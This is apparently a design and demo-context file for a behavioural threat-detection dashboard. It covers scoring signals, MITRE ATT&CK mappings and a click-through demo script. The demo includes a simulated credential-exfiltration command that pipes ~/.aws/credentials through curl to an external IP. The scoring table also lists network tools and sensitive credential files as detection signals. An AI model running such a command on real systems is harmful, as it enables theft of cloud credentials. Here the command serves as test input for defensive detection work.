# CONTEXT.md — ZeroTrace Domain Knowledge

---

## 1. What Is a Zero-Day Attack?

A **zero-day attack** exploits a vulnerability before any patch or signature exists. Because no vendor has had time to publish a detection rule, signature-based tools (AV, IDS) are blind to it. The attack has effectively *zero days* of prior public exposure.

**ZeroTrace's insight:** Even without a signature, a compromised process behaves differently from a legitimate one. It spawns unexpected child processes, reads credential files, and connects to unknown external IPs. This behavioral fingerprint can be detected without any prior knowledge of the exploit.

---

## 2. Why Behavioral Detection?

| Detection method | Zero-day coverage | Explanation |
|-----------------|------------------|-------------|
| Signature-based | ❌ None | No hash or pattern exists yet |
| Anomaly / behavioral | ✅ Yes | Deviations from baseline are visible |
| Reputation / threat intel | ⚠️ Partial | C2 IPs may not be listed yet |

Behavioral detection looks at:
- **Process lineage** — Who spawned this process? `npm` should not launch `/bin/sh`.
- **Command line** — Does the command read sensitive files and pipe them out?
- **Files touched** — Is `~/.aws/credentials` being read by a web server process?
- **Network destinations** — Is this process connecting to a non-business IP on a non-standard port?
- **User context** — Is a service account doing something a human would do?

---

## 3. Relevant MITRE ATT&CK Techniques

| Technique ID | Name | Relevance to ZeroTrace demo |
|-------------|------|----------------------------|
| **T1059.004** | Command and Scripting Interpreter: Unix Shell | `/bin/sh -c "..."` spawned by `node` |
| **T1048** | Exfiltration Over Alternative Protocol | `curl` to external IP on port 8443 |
| **T1552.001** | Unsecured Credentials: Credentials in Files | `cat ~/.aws/credentials` |
| **T1195.002** | Supply Chain Compromise: Compromise Software Supply Chain | Malicious npm dependency |
| **T1071.001** | Application Layer Protocol: Web Protocols | `curl` using HTTPS to exfiltrate |
| **T1057** | Process Discovery | Parent process enumeration signals |

---

## 4. Scoring Signals Used by ZeroTrace

The model weighs the following signals when computing `threatScore` (0–100):

| Signal | Weight | Example |
|--------|--------|---------|
| Sensitive file access (`~/.aws`, `/etc/shadow`, `~/.ssh`) | +35 | `cat ~/.aws/credentials` |
| External network destination (non-RFC 1918 IP) | +25 | `198.51.100.4:8443` |
| Shell spawned by non-shell parent | +20 | `npm → /bin/sh` |
| Pipe to network tool (`curl`, `wget`, `nc`) | +20 | `curl ... http://...` |
| Non-standard port (not 80/443) | +10 | port 8443 |
| Systemd / init as parent | -20 | `systemd → node` is expected |
| Known-good command pattern | -15 | `node /srv/app/dist/server.js --port 3000` |
| Working dir matches service root | -10 | `/srv/app` |
| No network destinations | -10 | local-only process |

> Signals are additive; the model clamps the final score to [0, 100].

---

## 5. Score Bands

| Band | Range | Verdict | Color | Action |
|------|-------|---------|-------|--------|
| Safe | 0–39 | `SAFE` | Green | Log and dismiss |
| Suspicious | 40–74 | `SUSPICIOUS` | Amber | Escalate to analyst |
| Critical | 75–100 | `CRITICAL` | Red | Immediate containment |

---

## 6. Glossary

| Term | Definition |
|------|-----------|
| **PID** | Process ID — unique integer assigned by the OS to a running process |
| **Process lineage** | The chain of parent → child processes that led to the suspicious process |
| **SSE** | Server-Sent Events — a unidirectional HTTP streaming protocol |
| **SOC** | Security Operations Center — team that monitors and responds to security events |
| **C2** | Command-and-Control — attacker-controlled server used to receive exfiltrated data or issue commands |
| **MITRE ATT&CK** | A globally accessible knowledge base of adversary tactics and techniques |
| **Exfiltration** | Unauthorized transfer of data from a system to an external location |
| **Containment** | Stopping a threat from spreading, e.g. killing a process or blocking a network connection |
| **Fallback** | Deterministic hardcoded response used when the LLM is unavailable |
| **Warm-up** | A no-op model call at startup to pre-load model weights into memory |

---

## 7. Demo Script (Click-by-Click)

### Prerequisites
- Backend running on `http://localhost:5001`
- Frontend running on `http://localhost:3000`
- Ollama running with `gemma4:e4b` pulled, OR `LLM_MODE=demo`

---

### Scene 1: Zero-Day Attack (score 96)

| Step | Action | Expected on-screen result |
|------|--------|--------------------------|
| 1 | Open `http://localhost:3000` | Dark SOC dashboard, status badge: **IDLE — No Active Threats** |
| 2 | Click **"Simulate Zero-Day Attack"** | Button spins; status badge: **ANALYZING…** |
| 3 | Wait ≤ 30 s | New incident card appears: PID **31337**, command `/bin/sh -c "cat ~/.aws/credentials \| curl … http://198.51.100.4:8443/collect"` |
| 4 | Observe score | Score badge: **96 — CRITICAL** (red), verdict: **CRITICAL BREACH** |
| 5 | Expand reasoning trail | ≥ 3 steps visible, e.g. "Shell spawned by npm", "AWS credentials read", "Data exfiltrated to 198.51.100.4:8443" |
| 6 | Observe MITRE badges | At least T1059.004, T1048, T1552.001 shown as clickable badges |
| 7 | Click **"Isolate Process (PID 31337) & Block Egress"** | Confirm dialog appears (or immediate action if no confirm) |
| 8 | Confirm | Status badge flips: **CRITICAL BREACH → CONTAINED** (green border); card shows "Killed PID 31337 · Blocked 198.51.100.4" |
| 9 | Click **"Export Post-Mortem"** | Browser downloads `postmortem-<incidentId>.md` |
| 10 | Open the downloaded file | Contains title, description, and ≥ 1 action item |

---

### Scene 2: Benign Activity (score ≈ 4)

| Step | Action | Expected on-screen result |
|------|--------|--------------------------|
| 1 | Click **"Simulate Benign Activity"** | Button spins briefly |
| 2 | Wait ≤ 30 s | New incident card appears: PID **1234**, command `node /srv/app/dist/server.js --port 3000` |
| 3 | Observe score | Score badge: **4 — SAFE** (green); no alert banner |
| 4 | Observe containment button | Button is **disabled** (safe processes cannot be isolated) |

---

### Recovery if demo fails

- If backend is down: refresh the page; the SSE indicator shows red — restart with `npm run dev` in `backend/`.
- If Ollama times out: ensure `LLM_MODE=auto` and the fallback kicks in (look for ⚡ badge on incident card).
- If score is wildly wrong: switch to `LLM_MODE=demo` and re-run.
